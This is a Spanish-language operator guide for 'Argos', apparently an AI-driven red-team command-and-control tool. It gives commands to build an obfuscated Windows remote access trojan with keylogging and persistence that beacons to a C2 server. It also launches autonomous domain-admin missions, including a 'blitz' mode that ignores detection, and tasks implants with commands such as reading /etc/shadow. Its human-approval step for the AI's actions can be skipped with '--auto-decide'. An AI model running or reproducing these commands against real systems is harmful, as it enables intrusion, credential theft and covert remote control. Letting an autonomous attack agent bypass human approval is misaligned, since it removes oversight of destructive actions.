# ARGOS CLI — Guía del Operador

Argos cuenta con una Interfaz de Línea de Comandos (CLI) robusta basada en la librería `Click`. Esta guía describe el flujo de trabajo típico de un operador de Red Team.

## 1. Generación de Arsenal

Antes de iniciar una misión, necesitas compilar los stagers o payloads.

```bash
# Compilar un RAT (Remote Access Trojan) para Windows ofuscado con Garble
argos arsenal build rat --os windows --arch amd64 --c2 https://10.0.0.5:8443 --obfuscation garble,upx --features keylogger,persist

# Ver los binarios disponibles
argos arsenal list
```

## 2. Iniciar una Misión Autónoma

El comando `start` arranca el **Director** (orquestador principal).

```bash
argos start \
  --target 10.20.0.0/24 \
  --goal "domain_admin" \
  --profile ghost \
  --mode pentest \
  --parallel 5 \
  --msf
```
**Perfiles disponibles:**
- `ghost`: Prioriza el sigilo absoluto. Minimiza escaneos ruidosos.
- `balanced`: Equilibrio entre velocidad y ruido.
- `blitz`: Maximiza velocidad. Ejecuta exploits agresivos sin importar la detección.

## 3. Human-In-The-Loop (HITL)

Por seguridad, Argos pone en cola acciones destructivas o críticas esperando aprobación humana, a menos que uses `--auto-decide`.

```bash
# Listar las acciones que la IA quiere ejecutar
argos decide list

# Aprobar la ejecución de una táctica (Ej: ID a1b2c3d4)
argos decide approve a1b2c3d4

# Aprobar pero modificando el comando final
argos decide approve a1b2c3d4 --custom "whoami && id"

# Rechazar la sugerencia
argos decide reject a1b2c3d4
```

## 4. Control de Agentes

Interactúa directamente con las sesiones establecidas (Cells).

```bash
# Ver agentes vivos
argos agent list

# Encolar un comando arbitrario para que el agente lo corra en su próximo beacon
argos agent exec <agent_id> "cat /etc/shadow"

# Matar el agente y borrar su persistencia
argos agent kill <agent_id> --clean
```

## 5. Reportes y Dashboard

```bash
# Abrir la interfaz interactiva completa (TUI)
argos dashboard

# Generar un informe ejecutivo al finalizar la misión
argos report generate --mission acmecorp --format pdf
```
